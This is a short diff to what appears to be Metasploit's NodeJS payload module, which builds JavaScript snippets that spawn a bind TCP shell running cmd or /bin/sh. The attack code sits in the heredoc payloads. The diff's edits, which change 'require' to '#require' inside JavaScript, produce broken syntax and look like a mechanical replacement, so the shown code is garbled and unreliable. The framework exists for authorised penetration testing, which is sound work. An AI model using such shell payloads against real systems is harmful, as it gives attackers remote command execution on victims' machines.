@@ -1,5 +1,5 @@
 # -*- coding: binary -*-
-require 'msf/core'
+#require 'msf/core'
 
 module Msf::Payload::NodeJS
   # Outputs a javascript snippet that spawns a bind TCP shell
@@ -7,7 +7,7 @@ module Msf::Payload::NodeJS
   def nodejs_bind_tcp
     cmd = <<-EOS
       (function(){
-        var require = global.require || global.process.mainModule.constructor._load;
+        var #require = global.#require || global.process.mainModule.constructor._load;
         if (!require) return;
 
         var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh";
@@ -48,7 +48,7 @@ module Msf::Payload::NodeJS
     # however, this fallback might break in later versions of nodejs.
     cmd = <<-EOS
       (function(){
-        var require = global.require || global.process.mainModule.constructor._load;
+        var #require = global.#require || global.process.mainModule.constructor._load;
         if (!require) return;
         var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh";
         var net = require("#{net_lib}"),
